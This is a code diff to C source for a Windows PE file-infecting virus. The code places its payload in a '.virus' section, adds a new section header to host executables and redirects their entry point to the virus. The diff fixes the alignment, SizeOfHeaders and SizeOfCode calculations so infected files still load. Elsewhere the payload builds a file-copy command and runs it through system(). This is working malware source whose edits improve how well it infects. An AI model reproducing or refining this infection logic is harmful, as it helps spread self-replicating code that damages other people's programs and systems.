@@ -1,4 +1,5 @@
 // https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#export-directory-table
+// https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32
 
 #include <stdio.h>
 #include <string.h>
@@ -8,10 +9,8 @@
 // #define KERNEL32_DLL 3
 // #define CURRENT_EXE 1
 
-#define SET_SECT __attribute__((section(V_SECT_NAME)))
-
 #define V_SECT_NAME ".virus"
-
+#define SET_SECT __attribute__((section(V_SECT_NAME)))
 
 #define CALL(function) goto function 
 #define RET(function) goto function##_ret 
@@ -89,12 +88,10 @@ void payload(void)
 
 
 // do sth.
-typedef int (*t_puts)(const char *);
-char s_puts[] = "puts";
-typedef int (*t_printf) (const char *, ...);
-char s_printf[] = "printf";
-
-const char empty_str[] = ""; 
+    typedef int (*t_puts)(const char *);
+    char s_puts[] = "puts";
+    typedef int (*t_printf) (const char *, ...);
+    char s_printf[] = "printf";
 
     // test
     {
@@ -140,8 +137,8 @@ const char empty_str[] = "";
         :"=r" (offset)
         :
         :"eax", "ebx"
-    );
-    offset += 3;
+    ); // get the offset of that mov instr
+    offset += 3; // get the offset of the addr in that instr
 
     // 
     CALL(infect);
@@ -211,7 +208,6 @@ const char empty_str[] = "";
         FUNCTION(sprintf)(cpy_cmd, cpy_fomat, txt_file_name, dest_path);
         FUNCTION(system)(cpy_cmd);
 
-
         RET(task1);
     } // end of task1
 
@@ -276,14 +272,14 @@ const char empty_str[] = "";
         }
 
         // Preparing for adding new section header
+        DWORD FileAlignment = i_nt_headers.OptionalHeader.FileAlignment;
         // the end of IMAGE_SECTION_HEADERs (from FILE_BEGIN)
         int position = i_dos_header.e_lfanew 
             + sizeof(IMAGE_NT_HEADERS) 
             + i_nt_headers.FileHeader.NumberOfSections
             *sizeof(IMAGE_SECTION_HEADER); 
         // spare space of IMAGE_SECTION_HEADER
-        int space = i_nt_headers.OptionalHeader.FileAlignment 
-            - position % i_nt_headers.OptionalHeader.FileAlignment;
+        int space = FileAlignment - position % FileAlignment;
 
         injectable = injectable && (space >= sizeof(IMAGE_SECTION_HEADER)); 
 
@@ -299,9 +295,8 @@ const char empty_str[] = "";
         int sect_start = position + space;  // start of original (host) codes
         int sect_end = sect_start + raw_data_size;  // end of original (host) codes
 
-        DWORD payload_raw_size = ((payload_info.size / i_nt_headers.OptionalHeader.FileAlignment)
-            + !!(payload_info.size % i_nt_headers.OptionalHeader.FileAlignment))
-            *i_nt_headers.OptionalHeader.FileAlignment;
+        DWORD payload_raw_size = ((payload_info.size / FileAlignment)
+            + (!!(payload_info.size % FileAlignment)))*FileAlignment;
         DWORD PointerToRawData = sect_end;
 
         // i_sect_header is now the header of last section
@@ -325,18 +320,27 @@ const char empty_str[] = "";
         FUNCTION(fseek)(host, 0, SEEK_CUR);
         FUNCTION(fwrite)(&new_sect_header, 1, sizeof(new_sect_header), host);
         // END adding new section header()
-                
+
         // Updating nt_headers
         DWORD AddressOfEntryPoint = i_nt_headers.OptionalHeader.AddressOfEntryPoint;
         i_nt_headers.OptionalHeader.AddressOfEntryPoint = virus_v_addr;
         i_nt_headers.FileHeader.NumberOfSections++;
+
         // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
         // del: i_nt_headers.OptionalHeader.SizeOfHeaders += sizeof(IMAGE_SECTION_HEADER);
+        DWORD SizeOfHeaders = i_dos_header.e_lfanew + 4 /*size of signature*/
+            + sizeof(IMAGE_FILE_HEADER)
+            + i_nt_headers.FileHeader.SizeOfOptionalHeader
+            + i_nt_headers.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
+        SizeOfHeaders += FileAlignment - SizeOfHeaders % FileAlignment;
+        i_nt_headers.OptionalHeader.SizeOfHeaders = SizeOfHeaders;
+
         // add: 
         i_nt_headers.OptionalHeader.BaseOfCode = virus_v_addr;
         // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
-        // i_nt_headers.OptionalHeader.SizeOfCode += sizeof(IMAGE_SECTION_HEADER);
+        i_nt_headers.OptionalHeader.SizeOfCode += payload_raw_size;
+
         i_nt_headers.OptionalHeader.SizeOfImage += payload_info.size
             + i_nt_headers.OptionalHeader.SectionAlignment 
             - payload_info.size % i_nt_headers.OptionalHeader.SectionAlignment;
